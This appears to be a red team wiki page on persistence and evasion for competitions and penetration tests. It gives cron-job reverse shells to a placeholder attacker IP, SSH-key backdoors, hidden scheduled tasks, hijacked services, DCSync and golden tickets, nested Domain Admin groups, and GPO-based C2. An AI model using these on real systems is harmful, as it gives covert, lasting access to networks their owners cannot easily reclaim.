We should accomplish persistence several ways if possible, while sometimes leaving false IOCs, assisting us in [[Evasion|Evading]] detection. 
## Persistence via C2 Infrastructure

The C2 implant of choice for CU at the time of writing is [[Sliver C2]]. You can find a whole host of other options in the C2Matrix here: https://docs.google.com/spreadsheets/d/1b4mUxa6cDQuTV2BPC6aA-GR4zGZi0ooPYtBe4IgPsSc/edit#gid=0. This is a publicly available resource that compares C2 infrastructures against each other. If evasion becomes an absolute necessity in the future, or Sliver's feature count becomes insufficient, the author recommends rolling a custom [[Mythic]] agent, or building our own custom C2 infrastructure using existing techniques.

[[MSFVenom]] also contains functionality for binding malware to legitimate executables. However, this must be done in conjunction with [[Evasion]] as all MSFVenom payloads and TTPs are well signatured. 

## Persistence via LOL (Living off the Land)
#### Linux
- Install and enable new service
- Malicious user acct
###### Cron jobs: 
- Put a reverse shell in a cron job. This is the classic reverse shell string: 
  `/bin/bash -i > /dev/tcp/<attacker-IP>/<port> 0<&1 2>&1`
- If the victim machine has the traditional version of netcat installed, then this would work as well: `nc -e /bin/bash <ATTACKER_IP> <PORT>`
These are all the places you can hide cron jobs:
- `/var/spool/cron/crontabs/` — per-user cron jobs
- `/etc/crontab` — system crontab file, this will have references to all the other system crontab files below
- `/etc/cron.d/`
- `/etc/cron.hourly/`
- `/etc/cron.daily/`
- `/etc/cron.weekly/`
- `/etc/cron.monthly/`

###### SSH Keys:
- If you don't have an SSH key, generate one with `ssh-keygen`. 
- Add your public key to the `~/.ssh/authorized_keys` file in every user's directory. Create the file if it isn't already present, then add a new line in the file and put your public key there.
- Set the permissions on the file and directory by running `chmod 700 ~/.ssh` and 
  `chmod 600 ~/.ssh/authorized_keys`
- 

- Windows
	- Registry Run Keys
	- Scheduled Tasks
		- Can delete attribute SD from task at HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\Tree\\\<TASK\> to hide the running task from `schtasks`.
	- Startup Folder
	- Malicious user acct
		- Administrator User
			- If NOT:
				- Backup Operators && Remote Management Users member can export HKLM\\system and HKLM\\sam to PTH with [[Evil-WinRM]]. This can also be accomplished by editing config.inf with [[secedit]] directly and adding the user to privileged groups and assigning privileges to the user directly via the GUI. This prevents the new groups from appearing in a user summary. TODO: Finish this with more details
	- DLL Hijacking
	- Poisoning Shortcuts
	- Backdoor Applications
		- [[MSFVenom]] has functionality for this.
	- Replace Default Applications for File types
		- HKEY_CLASSES_ROOT???
	- Malicious Services
		- Replace the binPath property of an existing Windows service with your implant to avoid creating a new service. Simple commands can also be used as binPath, meaning `net user redteam password /add` is permissible. If you plan to use an implant as a service make sure to compile as `exe-service` with [[MSFVenom]].

## Domain Persistence
### Credentials
You can acquire hashes of users using [[Mimikatz]]'s DCSync functionality for every user. This will grant access to the krbtgt account for golden tickets, etc. 

### Tickets
Golden and Silver Tickets are incredibly useful, and will grant persistence as well. The are generated most easily with [[Rubeus]] and [[Mimikatz]]. 

### Certificates

> [!error] Danger
> If you are generating a CA to have persistence, you are making blue team rebuild the domain to get you out. Only do this in nation-state sims and competitions where the domain does NOT have to be reused. In a penetration test, this is so far overkill you will not be invited back. 

[[Mimikatz]]

### SID History
SID History is used to facilitate transferring permissions from one domain to another for a user group. Therefore, if we artificially install the DA SID into our account we will maintain the DA privileges we had "before".
### Group Membership
Nested groups are hard to monitor. Since we have DA, we should make some. Example commands are from THM. 

```powershell
New-ADGroup -Path "OU=<some OU>,OU=<some OU>,DC=za,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
```

```powershell
New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security 
PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"
```

```powershell
Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
```

### ACLs
If we add ourselves to the template pushed out by the SDProp service every hour, even if blue team flushes us out, we can still reacquire access every time there is a push. Especially if we grant "Full Control" to Domain Users and maintain control over some low-privileged accounts, we can add ourselves to DA anytime we please. 

### GPO
We can create a GPO inside of the Admins group to run our C2 infra as an Administrator. If we set it to be Enforced, we can ensure it runs even if there are conflicting policies. We can add our shell or C2 to the logon scripts for admin users ensuring we get a callback every time they log into their machines. Lastly, we can remove edit permissions on a policy from even the Enterprise Admins, so a network reset will have to be performed to get us out. 
